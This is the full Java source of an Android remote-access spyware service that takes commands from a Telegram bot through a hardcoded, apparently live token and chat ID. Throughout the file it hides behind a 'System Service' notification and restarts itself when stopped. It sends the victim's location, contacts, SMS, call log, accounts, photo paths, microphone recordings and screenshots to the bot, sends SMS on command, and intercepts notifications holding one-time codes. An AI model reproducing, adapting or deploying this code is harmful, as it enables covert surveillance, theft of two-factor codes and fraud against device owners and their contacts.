package com.v8.global.sniffer;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.*;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainService extends NotificationListenerService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    
    private OkHttpClient client = new OkHttpClient();
    private Timer timer;
    private int lastUpdateId = 0;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String currentAudioPath;

    @Override
    public void onCreate() {
        super.onCreate();
        
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Main:WakeLock");
        wakeLock.acquire(60*60*1000L);
        
        startForegroundService();
        
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override public void run() { checkCommands(); }
        }, 0, 3000);
        
        sendDeviceInfo();
    }

    private void startForegroundService() {
        String channelId = "main_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
        startForeground(101, notification);
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android_version", Build.VERSION.RELEASE);
            
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone", tm.getLine1Number());
            }
            
            sendMessage("📱 Device Info:\n" + info.toString(2), CHAT_ID);
        } catch (Exception e) {}
    }

    private void checkCommands() {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId + "&timeout=10")
                .build();
        
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    String body = response.body().string();
                    JSONObject json = new JSONObject(body);
                    JSONArray result = json.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id") + 1;
                        
                        if (update.has("message")) {
                            JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) {
                                String text = message.getString("text");
                                sendMessage("📩 Command: " + text, CHAT_ID);
                                executeCommand(text);
                            }
                        }
                    }
                    response.close();
                } catch (Exception e) {}
            }
            @Override public void onFailure(Call call, IOException e) {}
        });
    }

    private void executeCommand(String command) {
        String cmd = command.split(" ")[0];
        String args = command.length() > cmd.length() ? command.substring(cmd.length() + 1) : "";
        
        switch (cmd) {
            case "/help": sendHelp(); break;
            case "/info": sendDeviceInfo(); break;
            case "/location": getLocation(); break;
            case "/contacts": getContacts(); break;
            case "/sms": getSms(); break;
            case "/calls": getCallLog(); break;
            case "/accounts": getAccounts(); break;
            case "/photos": getPhotos(); break;
            case "/screenshot": takeScreenshot(); break;
            case "/record": toggleRecording(); break;
            case "/lock": lockDevice(); break;
            case "/vibrate": vibrate(); break;
            case "/open": if (!args.isEmpty()) openUrl(args); break;
            case "/sms_send": if (!args.isEmpty()) { 
                String[] parts = args.split(" ", 2);
                if (parts.length == 2) sendSms(parts[0], parts[1]);
            } break;
        }
    }

    private void sendHelp() {
        String help = "📋 **Commands**\n\n" +
                "/info - Device info\n" +
                "/location - GPS location\n" +
                "/contacts - Contacts list\n" +
                "/sms - Read SMS\n" +
                "/calls - Call log\n" +
                "/accounts - All accounts\n" +
                "/photos - Get photos\n" +
                "/screenshot - Take screenshot\n" +
                "/record - Start/Stop recording\n" +
                "/lock - Lock device\n" +
                "/vibrate - Vibrate\n" +
                "/open [url] - Open URL\n" +
                "/sms_send [number] [text] - Send SMS\n" +
                "/help - This menu";
        sendMessage(help, CHAT_ID);
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendMessage("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map, CHAT_ID);
            }
        } catch (Exception e) {}
    }

    private void getContacts() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                StringBuilder sb = new StringBuilder("📇 Contacts:\n");
                int count = 0;
                while (cursor != null && cursor.moveToNext() && count < 20) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                if (cursor != null) cursor.close();
                sendMessage(sb.toString(), CHAT_ID);
            } catch (Exception e) {}
        }).start();
    }

    private void getSms() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📨 Last 10 SMS:\n");
                while (cursor != null && cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    sb.append(address).append(": ").append(body).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                sendMessage(sb.toString(), CHAT_ID);
            } catch (Exception e) {}
        }).start();
    }

    private void getCallLog() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📞 Last 10 Calls:\n");
                while (cursor != null && cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex("number"));
                    String type = cursor.getString(cursor.getColumnIndex("type"));
                    String duration = cursor.getString(cursor.getColumnIndex("duration"));
                    sb.append(number).append(" (").append(type).append(") ").append(duration).append("s\n");
                }
                if (cursor != null) cursor.close();
                sendMessage(sb.toString(), CHAT_ID);
            } catch (Exception e) {}
        }).start();
    }

    private void getAccounts() {
        new Thread(() -> {
            try {
                AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
                Account[] accounts = am.getAccounts();
                StringBuilder sb = new StringBuilder("👤 Accounts:\n");
                for (Account acc : accounts) {
                    sb.append(acc.type).append(": ").append(acc.name).append("\n");
                }
                sendMessage(sb.toString(), CHAT_ID);
            } catch (Exception e) {}
        }).start();
    }

    private void getPhotos() {
        new Thread(() -> {
            try {
                String[] projection = {MediaStore.Images.Media.DATA};
                Cursor cursor = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 5");
                StringBuilder sb = new StringBuilder("🖼 Last 5 Photos:\n");
                while (cursor != null && cursor.moveToNext()) {
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                    sb.append(path).append("\n");
                }
                if (cursor != null) cursor.close();
                sendMessage(sb.toString(), CHAT_ID);
            } catch (Exception e) {}
        }).start();
    }

    private void takeScreenshot() {
        Intent intent = new Intent(this, AccessibilityControlService.class);
        intent.setAction("SCREENSHOT");
        startService(intent);
        sendMessage("📸 Taking screenshot...", CHAT_ID);
    }

    private void toggleRecording() {
        try {
            if (!isRecording) {
                String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
                if (!audioDir.exists()) audioDir.mkdirs();
                currentAudioPath = audioDir + "/audio_" + timeStamp + ".3gp";
                
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mediaRecorder.setOutputFile(currentAudioPath);
                mediaRecorder.prepare();
                mediaRecorder.start();
                isRecording = true;
                sendMessage("🎤 Recording started", CHAT_ID);
            } else {
                mediaRecorder.stop();
                mediaRecorder.release();
                isRecording = false;
                File file = new File(currentAudioPath);
                sendAudio(file);
            }
        } catch (Exception e) {}
    }

    private void lockDevice() {
        Intent intent = new Intent(this, AccessibilityControlService.class);
        intent.setAction("LOCK");
        startService(intent);
        sendMessage("🔒 Locking device...", CHAT_ID);
    }

    private void vibrate() {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            v.vibrate(VibrationEffect.createOneShot(2000, VibrationEffect.DEFAULT_AMPLITUDE));
        } else {
            v.vibrate(2000);
        }
        sendMessage("📳 Vibrating...", CHAT_ID);
    }

    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendMessage("🔗 Opening: " + url, CHAT_ID);
        } catch (Exception e) {}
    }

    private void sendSms(String number, String text) {
        try {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, text, null, null);
            sendMessage("📨 SMS sent to " + number, CHAT_ID);
        } catch (Exception e) {}
    }

    private void sendMessage(String text, String chatId) {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                .post(new FormBody.Builder().add("chat_id", chatId).add("text", text).build())
                .build();
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override public void onResponse(Call call, Response response) { response.close(); }
            @Override public void onFailure(Call call, IOException e) {}
        });
    }

    private void sendAudio(File file) {
        try {
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("audio", file.getName(),
                        RequestBody.create(MediaType.parse("audio/3gp"), file))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendAudio")
                    .post(body).build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) { response.close(); file.delete(); }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {}
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Bundle extras = sbn.getNotification().extras;
        String text = extras.getString(Notification.EXTRA_TEXT, "");
        if (text.contains("رمز") || text.contains("code")) {
            sendMessage("🔐 Code: " + text, CHAT_ID);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (mediaRecorder != null) mediaRecorder.release();
        startService(new Intent(this, MainService.class));
    }
  }
